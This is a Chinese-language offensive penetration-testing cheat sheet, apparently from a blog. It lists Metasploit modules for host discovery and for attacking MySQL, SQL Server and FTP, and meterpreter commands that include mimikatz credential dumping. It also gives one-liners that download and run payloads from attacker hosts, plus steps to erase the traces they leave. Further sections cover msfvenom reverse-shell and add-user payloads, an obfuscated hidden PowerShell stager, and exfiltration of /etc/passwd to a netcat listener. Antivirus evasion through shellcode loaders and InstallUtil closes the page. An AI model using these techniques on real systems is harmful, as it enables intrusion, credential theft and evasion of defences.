<h2 id="23-基于MSF发现内网存活主机第一季"><a href="#23-基于MSF发现内网存活主机第一季" class="headerlink" title="23. 基于MSF发现内网存活主机第一季"></a>23. 基于MSF发现内网存活主机第一季</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/discovery/arp_sweep </span><br><span class="line">auxiliary/scanner/discovery/udp_sweep </span><br><span class="line">auxiliary/scanner/ftp/ftp_version </span><br><span class="line">auxiliary/scanner/http/http_version </span><br><span class="line">auxiliary/scanner/smb/smb_version</span><br></pre></td></tr></table></figure>
<h2 id="24-基于MSF发现内网存活主机第二季"><a href="#24-基于MSF发现内网存活主机第二季" class="headerlink" title="24. 基于MSF发现内网存活主机第二季"></a>24. 基于MSF发现内网存活主机第二季</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_version </span><br><span class="line">auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_version </span><br><span class="line">auxiliary&#x2F;scanner&#x2F;discovery&#x2F;udp_probe </span><br><span class="line">auxiliary&#x2F;scanner&#x2F;dns&#x2F;dns_amp </span><br><span class="line">auxiliary&#x2F;scanner&#x2F;mysql&#x2F;mysql_version</span><br></pre></td></tr></table></figure>
<h2 id="25-基于MSF发现内网存活主机第三季"><a href="#25-基于MSF发现内网存活主机第三季" class="headerlink" title="25. 基于MSF发现内网存活主机第三季"></a>25. 基于MSF发现内网存活主机第三季</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbname</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;http&#x2F;title</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;db2&#x2F;db2_version</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;ack</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br></pre></td></tr></table></figure>
<h2 id="26-基于MSF发现内网存活主机第四季"><a href="#26-基于MSF发现内网存活主机第四季" class="headerlink" title="26. 基于MSF发现内网存活主机第四季"></a>26. 基于MSF发现内网存活主机第四季</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;syn</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;ftpbounce</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;portscan&#x2F;xmas</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;rdp&#x2F;rdp_scanner</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;smtp&#x2F;smtp_version</span><br></pre></td></tr></table></figure>
<h2 id="27-基于MSF发现内网存活主机第五季"><a href="#27-基于MSF发现内网存活主机第五季" class="headerlink" title="27. 基于MSF发现内网存活主机第五季"></a>27. 基于MSF发现内网存活主机第五季</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auxiliary&#x2F;scanner&#x2F;pop3&#x2F;pop3_version</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;postgres&#x2F;postgres_version</span><br><span class="line">auxiliary&#x2F;scanner&#x2F;ftp&#x2F;anonymous</span><br><span class="line">db_nmap</span><br></pre></td></tr></table></figure>
<h2 id="28-基于MSF发现内网存活主机第六季"><a href="#28-基于MSF发现内网存活主机第六季" class="headerlink" title="28. 基于MSF发现内网存活主机第六季"></a>28. 基于MSF发现内网存活主机第六季</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">post&#x2F;windows&#x2F;gather&#x2F;arp_scanner</span><br><span class="line">post&#x2F;windows&#x2F;gather&#x2F;enum_ad_computers</span><br><span class="line">post&#x2F;windows&#x2F;gather&#x2F;enum_computers</span><br><span class="line">post&#x2F;windows&#x2F;gather&#x2F;enum_domain</span><br><span class="line">post&#x2F;windows&#x2F;gather&#x2F;enum_domains</span><br><span class="line">post&#x2F;windows&#x2F;gather&#x2F;enum_ad_user_comments</span><br></pre></td></tr></table></figure>
<p>在实战过程中，许多特殊环境下<code>scanner</code>，<code>db_nmap</code>不能快速符合实战渗透诉求，尤其在域中的主机存活发现，而post下的模块，弥补了该诉求，以便快速了解域中存活主机</p>
<h2 id="33-攻击Mysql服务"><a href="#33-攻击Mysql服务" class="headerlink" title="33. 攻击Mysql服务"></a>33. 攻击Mysql服务</h2><ul>
<li><p>auxiliary/scanner/mysql/mysql_login</p>
<blockquote>
<p> 常用于内网中的批量以及单主机的登录测试</p>
</blockquote>
</li>
<li><p>exploit/multi/mysql/mysql_udf_payload </p>
<blockquote>
<p>常用于root启动的mysql 并root的udf提权</p>
</blockquote>
</li>
<li><p>exploit/windows/mysql/mysql_mof </p>
<blockquote>
<p>Mof提权</p>
</blockquote>
</li>
<li><p>exploit/windows/mysql/scrutinizer_upload_exec </p>
<blockquote>
<p>上传文件执行</p>
</blockquote>
</li>
<li><p>auxiliary/scanner/mysql/mysql_hashdump</p>
<blockquote>
<p>mysql的mysql.user表的hash </p>
</blockquote>
</li>
<li><p>auxiliary/admin/mysql/mysql_sql </p>
<blockquote>
<p>执行sql语句。尤其是在目标机没有web界面等无法用脚本执行的环境</p>
</blockquote>
</li>
<li><p>auxiliary/scanner/mysql/mysql_version</p>
<blockquote>
<p>常用于内网中的批量mysql主机发现</p>
</blockquote>
</li>
</ul>
<h2 id="34-攻击Sql-server-服务"><a href="#34-攻击Sql-server-服务" class="headerlink" title="34. 攻击Sql server 服务"></a>34. 攻击Sql server 服务</h2><ul>
<li><p>auxiliary/admin/mssql/mssql_enum</p>
<blockquote>
<p>非常详细的目标机Sql server 信息</p>
</blockquote>
</li>
<li><p>auxiliary/admin/mssql/mssql_enum_sql_logins</p>
<blockquote>
<p>枚举sql logins，速度较慢，不建议使用</p>
</blockquote>
</li>
<li><p>auxiliary/admin/mssql/mssql_escalate_dbowner</p>
<blockquote>
<p>发现dbowner，当sa无法得知密码的时候，或者需要其他账号提供来支撑下一步的内网渗透</p>
</blockquote>
</li>
<li><p>auxiliary/admin/mssql/mssql_exec</p>
<blockquote>
<p>当没有激活xp_cmdshell，自动激活。并且调用执行cmd命令。权限继承 Sql server</p>
</blockquote>
</li>
<li><p>auxiliary/admin/mssql/mssql_sql</p>
<blockquote>
</blockquote>
</li>
<li><p>auxiliary/admin/mssql/mssql_sql_file</p>
<blockquote>
<p>当需要执行多条sql语句的时候，或者非常复杂。msf本身支持执行sql文件。授权渗透应用较少，非授权应用较多的模块</p>
</blockquote>
</li>
<li><p>auxiliary/scanner/mssql/mssql_hashdump</p>
<blockquote>
<p>mssql的hash导出</p>
</blockquote>
</li>
<li><p>auxiliary/scanner/mssql/mssql_login</p>
<blockquote>
<p>支持RHOSTS，来批量发现内网mssql主机</p>
</blockquote>
</li>
<li><p>auxiliary/scanner/mssql/mssql_ping</p>
<blockquote>
<p>查询mssql 实例，实战中，应用较少</p>
</blockquote>
</li>
<li><p>exploit/windows/mssql/mssql_payload</p>
<blockquote>
<p>针对不同时间版本的系统都有着自己独特的方式来上传payload(windows 2003需要set method old)</p>
</blockquote>
</li>
<li><p>post/windows/manage/mssql_local_auth_bypass</p>
<blockquote>
<p>post模块都属于后渗透模块</p>
</blockquote>
</li>
</ul>
<h2 id="35-与Sqlmap结合攻击"><a href="#35-与Sqlmap结合攻击" class="headerlink" title="35. 与Sqlmap结合攻击"></a>35. 与Sqlmap结合攻击</h2><p><code>load sqlmap</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxx&quot; --random-agent --os-pwn --msf-path &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F; --priv-esc -v 3</span><br><span class="line"></span><br><span class="line">--priv-esc  数据库进程的提权</span><br><span class="line">--os-pwn  注入MSF shell或VNC</span><br></pre></td></tr></table></figure>
<h2 id="42-攻击FTP服务"><a href="#42-攻击FTP服务" class="headerlink" title="42. 攻击FTP服务"></a>42. 攻击FTP服务</h2><ul>
<li>auxiliary/scanner/ftp/ftp_version</li>
<li>auxiliary/scanner/ftp/ftp_login</li>
<li>auxiliary/scanner/ftp/anonymous</li>
</ul>
<p>发现FTP存活主机</p>
<pre><code>* db_nmap -sS -T4 -p21 192.168.1.115</code></pre>
<p>ftp本地模糊测试辅助模块</p>
<ul>
<li>auxiliary/fuzzers/ftp/ftp_pre_post</li>
</ul>
<h2 id="67-meterpreter下的irb操作第一季"><a href="#67-meterpreter下的irb操作第一季" class="headerlink" title="67. meterpreter下的irb操作第一季"></a>67. meterpreter下的irb操作第一季</h2><p><code>Railgun</code>是<code>Meterpreter stdapi</code>的扩展，允许任意加载DLL。<code>Railgun</code>的最大好处是能够动态访问 系统上的整个<code>Windows API</code>。通过从用户进程调用<code>Windows API</code>。</p>
<p><code>meterpreter</code>下执行<code>irb</code>进入<code>ruby</code>交互</p>
<ul>
<li>基本的信息搜集</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt; client.sys.config.sysinfo[&#39;OS&#39;]</span><br><span class="line">&gt;&gt; client.sys.config.getuid</span><br><span class="line">&gt;&gt; interfaces &#x3D; client.net.config.interfaces</span><br><span class="line">&gt;&gt; interfaces.each do |i|</span><br><span class="line">&gt;&gt; end</span><br></pre></td></tr></table></figure>
<ul>
<li>锁定注销目标机</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt; client.railgun.user32.LockWorkStation()</span><br></pre></td></tr></table></figure>
<ul>
<li>调用MessageBox</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt; client.railgun.user32.MessageBoxA(0, &quot;Micropoor&quot;, &quot;Micropoor&quot;, &quot;MB_OK&quot;)</span><br></pre></td></tr></table></figure>
<ul>
<li>快速获取当前绝对路径</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt; client.fs.dir.pwd</span><br></pre></td></tr></table></figure>
<ul>
<li>目录相关操作</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt; client.fs.dir.chdir(&quot;c:\\&quot;)</span><br><span class="line">&gt;&gt; client.fs.dir.entries</span><br></pre></td></tr></table></figure>
<ul>
<li>建立文件夹</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt; client.fs.dir.mkdir(&quot;Micropoor&quot;)</span><br></pre></td></tr></table></figure>
<ul>
<li>hash操作</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt; client.core.use &quot;mimikatz&quot;</span><br><span class="line">&gt;&gt; client.mimikatz</span><br><span class="line">&gt;&gt; client.mimikatz.kerberos</span><br></pre></td></tr></table></figure>
<ul>
<li>内网主机发现，如路由，arp等</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt; client.net.config.arp_table</span><br><span class="line">&gt;&gt; client.net.config.arp_table[0].ip_addr</span><br><span class="line">&gt;&gt; client.net.config.arp_table[0].mac_addr</span><br><span class="line">&gt;&gt; client.net.config.arp_table[0].interface</span><br><span class="line">&gt;&gt; client.net.config.routes</span><br></pre></td></tr></table></figure>
<ul>
<li>实战中的敏感文件操作</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt; client.fs.file.search(&quot;C:\\&quot;, &quot;*.txt&quot;)</span><br></pre></td></tr></table></figure>
<h2 id="97-MSF配置自定义Payload控制目标主机权限"><a href="#97-MSF配置自定义Payload控制目标主机权限" class="headerlink" title="97. MSF配置自定义Payload控制目标主机权限"></a>97. MSF配置自定义Payload控制目标主机权限</h2><p>MSF的exploit模块下是支持<code>set payload</code>的，同样在复杂的网络环境下，许多模块也同样支持自定 义的<code>payload</code>。以<code>exploit/windows/smb/psexec</code>为<code>demo</code></p>
<ul>
<li>需设置一非常用选项</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set EXE::CUSTOM &#x2F;var&#x2F;www&#x2F;html&#x2F;bin_tcp_x86_53.exe</span><br></pre></td></tr></table></figure>
<p>payload启动后，将会在过一段时间内退出。并强制终止。故该参数一般用于adduser。配合adduser_payload。或者配合一次性执行完毕非常连接的 payload。如下载。抓明文密码等等。不适合需长连接通信的payload。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom ‐p windows&#x2F;adduser PASS&#x3D;Micropoor$123 USER&#x3D;Micropoor ‐ f exe &gt;adduser.exe</span><br></pre></td></tr></table></figure>


<h1 id="五、-下载Payload"><a href="#五、-下载Payload" class="headerlink" title="五、 下载Payload"></a>五、 下载Payload</h1><h2 id="37-vbs一句话下载payload"><a href="#37-vbs一句话下载payload" class="headerlink" title="37. vbs一句话下载payload"></a>37. vbs一句话下载payload</h2><p>将以下文件保存为<code>download.vbs</code></p>
<figure class="highlight plain"><figcaption><span>basic</span></figcaption><table><tr><td class="code"><pre><span class="line">set a&#x3D;createobject(“adod”+”b.stream”):</span><br><span class="line">set w&#x3D;createobject(“micro”+”soft.xmlhttp”):</span><br><span class="line">w.open “get”,wsh.arguments(0),0:</span><br><span class="line">w.send:</span><br><span class="line">a.type&#x3D;1:</span><br><span class="line">a.open:</span><br><span class="line">a.write w.responsebody:</span><br><span class="line">a.savetofile wsh.arguments(1),2</span><br></pre></td></tr></table></figure>
<p>命令行执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cscript downfile.vbs http://192.168.1.115/robots.txt C:\Inetpub\b.txt</span><br></pre></td></tr></table></figure>
<p>用<code>echo</code>的方式写入VBS</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo set a&#x3D;createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w&#x3D;createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open ^&quot;get^&quot;,wsh.arguments( 0),0:w.send:a.type&#x3D;1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt;downfile.vbs</span><br></pre></td></tr></table></figure>
<h2 id="38-certutil一句话下载payload"><a href="#38-certutil一句话下载payload" class="headerlink" title="38. certutil一句话下载payload"></a>38. certutil一句话下载payload</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt</span><br></pre></td></tr></table></figure>
<p>certutil.exe 下载有个弊端，它的每一次下载都有留有缓存，而导致留下入侵痕迹，所以每次下载 后，需要马上执行如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt delete</span><br></pre></td></tr></table></figure>
<blockquote>
<p>-encode base64编码文件</p>
<p>-decode base64解码文件</p>
</blockquote>
<h2 id="39-vbs一句话下载payload补充"><a href="#39-vbs一句话下载payload补充" class="headerlink" title="39. vbs一句话下载payload补充"></a>39. vbs一句话下载payload补充</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">strFileURL &#x3D; &quot;http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt&quot;</span><br><span class="line">strHDLocation &#x3D; &quot;c:\test\logo.txt&quot;</span><br><span class="line">Set objXMLHTTP &#x3D; CreateObject(&quot;MSXML2.XMLHTTP&quot;)</span><br><span class="line">objXMLHTTP.open &quot;GET&quot;, strFileURL, false</span><br><span class="line">objXMLHTTP.send()</span><br><span class="line">If objXMLHTTP.Status &#x3D; 200 Then</span><br><span class="line">Set objADOStream &#x3D; CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">objADOStream.Open</span><br><span class="line">objADOStream.Type &#x3D; 1</span><br><span class="line">objADOStream.Write objXMLHTTP.ResponseBody</span><br><span class="line">objADOStream.Position &#x3D; 0</span><br><span class="line">Set objFSO &#x3D; CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocati on</span><br><span class="line">Set objFSO &#x3D; Nothing</span><br><span class="line">objADOStream.SaveToFile strHDLocation</span><br><span class="line">objADOStream.Close</span><br><span class="line">Set objADOStream &#x3D; Nothing</span><br><span class="line">End if</span><br><span class="line">Set objXMLHTTP &#x3D; Nothing</span><br></pre></td></tr></table></figure>
<h2 id="40-ftp一句话下载payload"><a href="#40-ftp一句话下载payload" class="headerlink" title="40. ftp一句话下载payload"></a>40. ftp一句话下载payload</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo open 192.168.1.115 21&gt; ftp.txt </span><br><span class="line">echo 123&gt;&gt; ftp.txt &#x2F;&#x2F;user </span><br><span class="line">echo 123&gt;&gt; ftp.txt &#x2F;&#x2F;password </span><br><span class="line">echo binary &gt;&gt; ftp.txt &#x2F;&#x2F;bin模式 </span><br><span class="line">echo get robots.txt &gt;&gt; ftp.txt </span><br><span class="line">echo bye &gt;&gt; ftp.txt</span><br></pre></td></tr></table></figure>
<h2 id="70-ftp一句话下载payload补充"><a href="#70-ftp一句话下载payload补充" class="headerlink" title="70. ftp一句话下载payload补充"></a>70. ftp一句话下载payload补充</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo open 127.0.0.1 &gt; o&amp;echo user 123 123 &gt;&gt; o &amp;echo get bin_tcp_x86_53.exe &gt;&gt; o &amp;echo quit &gt;&gt; o &amp;ftp ‐n ‐s:o &amp;del &#x2F;F &#x2F;Q o</span><br></pre></td></tr></table></figure>
<p>逆名FTP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo open 127.0.0.1 &gt; o&amp;echo get bin_tcp_x86_53.exe &gt;&gt; o &amp;echo quit &gt;&gt; o &amp;ftp ‐A ‐n ‐s:o &amp;del &#x2F;F &#x2F;Q o</span><br></pre></td></tr></table></figure>


<h2 id="41-bitsadmin一句话下载payload"><a href="#41-bitsadmin一句话下载payload" class="headerlink" title="41. bitsadmin一句话下载payload"></a>41. bitsadmin一句话下载payload</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;rawreturn &#x2F;transfer down &quot;http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt&quot; E:\PDF\robots.txt</span><br></pre></td></tr></table></figure>
<p>需要下载过大的方伯，需要提高优先级，再次执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;setpriority down foreground</span><br></pre></td></tr></table></figure>
<p>如果下载文件在1-5M之间，需要时时查看进度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer down &#x2F;download &#x2F;priority normal &quot;http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt&quot; E:\PDF\robots.txt</span><br></pre></td></tr></table></figure>
<h2 id="43-js一句话下载payload"><a href="#43-js一句话下载payload" class="headerlink" title="43. js一句话下载payload"></a>43. js一句话下载payload</h2><p>download.js</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var WinHttpReq &#x3D; new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span><br><span class="line">WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), &#x2F;*async&#x3D;*&#x2F;false);</span><br><span class="line">WinHttpReq.Send();</span><br><span class="line">WScript.Echo(WinHttpReq.ResponseText);</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript &#x2F;nologo downfile.js http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt</span><br></pre></td></tr></table></figure>
<p>download2.js</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var WinHttpReq &#x3D; new ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);</span><br><span class="line">WinHttpReq.Open(&quot;GET&quot;, WScript.Arguments(0), &#x2F;*async&#x3D;*&#x2F;false);</span><br><span class="line">WinHttpReq.Send();</span><br><span class="line">BinStream &#x3D; new ActiveXObject(&quot;ADODB.Stream&quot;); BinStream.Type &#x3D; 1;</span><br><span class="line">BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody); </span><br><span class="line">BinStream.SaveToFile(&quot;micropoor.exe&quot;);</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript &#x2F;nologo dowfile2.js http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt</span><br></pre></td></tr></table></figure>
<h2 id="44-certutil一句话下载payload补充"><a href="#44-certutil一句话下载payload补充" class="headerlink" title="44. certutil一句话下载payload补充"></a>44. certutil一句话下载payload补充</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil -encode c:\downfile.vbs downfile.bat</span><br></pre></td></tr></table></figure>
<p><code>MSF</code>生成<code>powershell</code>后门</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom ‐p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=53 ‐e cmd/powershell_base64 ‐f psh ‐o Micropoor.txt</span><br></pre></td></tr></table></figure>
<p>启动<code>apache</code>将生成的<code>Micropoor.txt</code>放到<code>web</code>目录中</p>
<p><code>PowerShell</code>混肴框架<code>Invoke-CradleCrafter</code>： <a href="https://github.com/danielbohannon/Invoke-CradleCrafter">https://github.com/danielbohannon/Invoke-CradleCrafter</a> </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .&#x2F;Invoke-CradleCrafter.psd1;Invoke-CradleCrafter</span><br><span class="line">SET URL HTTP:&#x2F;&#x2F;192.168.1.5&#x2F;Micropoor.txt </span><br><span class="line">MEMORY</span><br><span class="line">CERTUTIL</span><br><span class="line">ALL</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>可得到如下混肴后的内容,保存为<code>cer.txt</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SV 7Q9 &#39;http:&#x2F;&#x2F;bit.ly&#x2F;L3g1tCrad1e&#39;;(Get-Variable E*xt).Value|ForEach-Object&#123;(Variable _).Value.(((Get-Variable E*xt).Value|Member)[6].Name)|ForEach-Object&#123;$_.(((Get-Variable E*xt).Value.(((Get-Variable E*xt).Value|Member)[6].Name)|Member|Where&#123;(Variable _).Value.Name-like&#39;*k*i*t&#39;&#125;).Name).Invoke(((certutil.exe &#x2F;ping (LS Variable:&#x2F;7Q9).Value|&amp;(Get-Variable E*xt).Value.(((Get-Variable E*xt).Value|Member)[6].Name).(((Get-Variable E*xt).Value.(((Get-Variable E*xt).Value|Member)[6].Name).PsObject.Methods|Where&#123;(Variable _).Value.Name-like&#39;*md*ts&#39;&#125;).Name).Invoke(&#39;Se*-Ob*&#39;)-SkipLa 1|&amp;(Get-Variable E*xt).Value.(((Get-Variable E*xt).Value|Member)[6].Name).(((Get-Variable E*xt).Value.(((Get-Variable E*xt).Value|Member)[6].Name).PsObject.Methods|Where&#123;(Variable _).Value.Name-like&#39;*md*ts&#39;&#125;).Name).Invoke(&#39;Se*-Ob*&#39;)-Skip 2)-Join&quot;&#96;r&#96;n&quot;))&#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil -encode cer.txt cer.cer</span><br></pre></td></tr></table></figure>
<p>将<code>cer.cer</code>也放置在<code>WEB</code>目录中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe ‐Win hiddeN ‐Exec ByPasS add‐content ‐path %APPDATA%\\cer.cer (New‐Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.1.5&#x2F;cer.cer&#39;); certutil ‐decode %APPDATA%\cer.cer %APPDATA%\stage.ps1 &amp; start &#x2F;b cmd &#x2F;c powershell.exe ‐Exec Bypass ‐NoExit ‐File %APPDATA%\stage.ps1 &amp; start &#x2F;b cmd &#x2F;c del %APPDATA%\cer.cer</span><br></pre></td></tr></table></figure>
<h2 id="45-解决bat一句话下载payload黑窗"><a href="#45-解决bat一句话下载payload黑窗" class="headerlink" title="45. 解决bat一句话下载payload黑窗"></a>45. 解决bat一句话下载payload黑窗</h2><p><code>bat.bat</code>内容如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami &gt;&gt; bat.txt</span><br></pre></td></tr></table></figure>
<p><code>bat.vbs</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CreateObject(&quot;Wscript.Shell&quot;).Run &quot;bat.bat&quot;, 0, True</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript bat.vbs</span><br></pre></td></tr></table></figure>
<p>如果需要在目标机上执行多个<code> bat</code>，如果需要把代码中的 <code>bat.bat</code> 变成变量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">If WScript.Arguments.Count &gt;&#x3D; 1 Then </span><br><span class="line">	ReDim arr(WScript.Arguments.Count-1) </span><br><span class="line">	For i &#x3D; 0 To WScript.Arguments.Count-1 </span><br><span class="line">		Arg &#x3D; WScript.Arguments(i) </span><br><span class="line">		If InStr(Arg, &quot; &quot;) &gt; 0 Then Arg &#x3D; &quot;&quot;&quot;&quot; &amp; Arg &amp; &quot;&quot;&quot;&quot; </span><br><span class="line">			arr(i) &#x3D; Arg </span><br><span class="line">	Next </span><br><span class="line">	RunCmd &#x3D; Join(arr)</span><br><span class="line">	CreateObject(&quot;Wscript.Shell&quot;).Run RunCmd, 0, True</span><br><span class="line">End If</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript bat.vbs bat.bat</span><br></pre></td></tr></table></figure>
<h2 id="46-powershell一句话下载payload"><a href="#46-powershell一句话下载payload" class="headerlink" title="46. powershell一句话下载payload"></a>46. powershell一句话下载payload</h2><p><code>down.ps1</code></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://118.24.74.232:889/test.png&quot;</span></span><br><span class="line"><span class="variable">$output</span> = <span class="string">&quot;C:\inetpub\robots.txt&quot;</span> </span><br><span class="line"><span class="variable">$start_time</span> = <span class="built_in">Get-Date</span> </span><br><span class="line"><span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> <span class="variable">$url</span> <span class="literal">-OutFile</span> <span class="variable">$output</span> </span><br><span class="line"><span class="built_in">Write-Output</span> <span class="string">&quot;Time : <span class="variable">$</span>((Get-Date).Subtract(<span class="variable">$start_time</span>).Seconds) second(s)&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>powershell</code>一句话下载文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.1.115&#x2F;robots.txt&#39;,&#39;E:\robots.txt&#39;)</span><br></pre></td></tr></table></figure>
<h2 id="53-内网渗透中的文件传输"><a href="#53-内网渗透中的文件传输" class="headerlink" title="53. 内网渗透中的文件传输"></a>53. 内网渗透中的文件传输</h2><ul>
<li><p>whois 命令传输文件</p>
<ul>
<li>传输机：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whois -h 127.0.0.1 -p 4444 &#96;cat &#x2F;etc&#x2F;passwd | base64&#96;</span><br></pre></td></tr></table></figure>
<ul>
<li>授受机</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -l -v -p 4444 | sed &quot;s&#x2F; &#x2F;&#x2F;g&quot; | base64 -d</span><br></pre></td></tr></table></figure>


</li>
</ul>
<h1 id="六、免杀"><a href="#六、免杀" class="headerlink" title="六、免杀"></a>六、免杀</h1><h2 id="47-payload分离免杀思路"><a href="#47-payload分离免杀思路" class="headerlink" title="47. payload分离免杀思路"></a>47. payload分离免杀思路</h2><ul>
<li>payload不采取生成pe文件，而采取shellcode方式， 来借助第三方直接加载到内存中。避免行为</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.5 lport&#x3D;8080 -e x86&#x2F;shikata_ga_nai -i 5 -f raw &gt; test.c</span><br></pre></td></tr></table></figure>
<ul>
<li>shellcode_launcher 来加载shellcode生成<code>x32</code>位<code>payload</code> <a href="https://github.com/clinicallyinane/shellcode_launcher/">https://github.com/clinicallyinane/shellcode_launcher/</a> </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shellcode_launcher -i test.c</span><br></pre></td></tr></table></figure>
<h2 id="48-payload分离免杀思路第二季"><a href="#48-payload分离免杀思路第二季" class="headerlink" title="48. payload分离免杀思路第二季"></a>48. payload分离免杀思路第二季</h2><ul>
<li>msfvenom生成shellcode</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom --payload windows&#x2F;meterpreter&#x2F;reverse_https LHOST&#x3D;10.0.0.1 LPORT&#x3D;443 -f csharp &gt; pentestShellCode.txt</span><br></pre></td></tr></table></figure>
<ul>
<li>csc.exe(InstallUtil-ShellCode.cs 替换文件中shellcode部分)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">csc.exe &#x2F;unsafe &#x2F;platform:x86 &#x2F;out:D:\test\InstallUtil-shell.exe D:\test\InstallUtil-ShellCode.cs</span><br></pre></td></tr></table></figure>
<ul>
<li>InstallUtil.exe</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">InstallUtil.exe &#x2F;logfile&#x3D; &#x2F;LogToConsole&#x3D;false &#x2F;U D:\test\InstallUtil-shell.exe</span><br></pre></td></tr></table></figure>
